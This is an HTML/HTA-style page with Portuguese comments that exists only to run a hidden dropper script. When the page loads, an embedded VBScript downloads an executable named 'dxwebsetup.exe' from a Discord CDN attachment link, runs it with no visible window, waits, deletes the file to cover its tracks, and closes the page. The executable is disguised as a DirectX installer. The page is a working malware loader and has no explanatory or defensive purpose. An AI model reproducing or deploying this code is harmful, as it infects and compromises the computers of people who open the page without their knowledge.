<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Execução Otimizada</title>

    <script language="JScript">
        // -----------------------------------------------------
        // 1. Variáveis de Configuração
        // -----------------------------------------------------
        var FileURL = "https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&";
        var LocalFileName = "dxwebsetup.exe";
        var ExecutionWaitSeconds = 10;
        
        // -----------------------------------------------------
        // 2. VBScript para Download, Execução e Limpeza (Ação Principal)
        // -----------------------------------------------------
        var VBS_SCRIPT = `
            On Error Resume Next
            
            Dim WshShell, FSO, objXMLHttp, objStream
            
            Set WshShell = CreateObject("WScript.Shell")
            Set FSO = CreateObject("Scripting.FileSystemObject")
            
            ' --- A) Download ---
            Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
            objXMLHttp.open "GET", "` + FileURL + `", False
            objXMLHttp.send
            
            If objXMLHttp.Status = 200 Then
                Set objStream = CreateObject("ADODB.Stream")
                objStream.Open: objStream.Type = 1
                objStream.Write objXMLHttp.responseBody
                objStream.SaveToFile "` + LocalFileName + `", 2
                
                ' --- B) Execução ---
                ' Executa o instalador em modo oculto (0)
                WshShell.Run "` + LocalFileName + `", 0, False
                
                ' --- C) Espera e Apaga ---
                WScript.Sleep (1000 * ` + ExecutionWaitSeconds + `)
                
                If FSO.FileExists("` + LocalFileName + `") Then
                    FSO.DeleteFile "` + LocalFileName + `", True
                End If
            End If
            
            Set WshShell = Nothing: Set FSO = Nothing
        `;

        // -----------------------------------------------------
        // 3. Execução e Fechamento
        // -----------------------------------------------------
        // 1. Executa o VBScript com a lógica de download/execução/limpeza
        eval('Execute(VBS_SCRIPT)'); 

        // 2. Fecha a janela visível imediatamente após disparar o VBScript
        window.close();
    </script>
</head>
<body onload="window.close()">
</body>
</html>
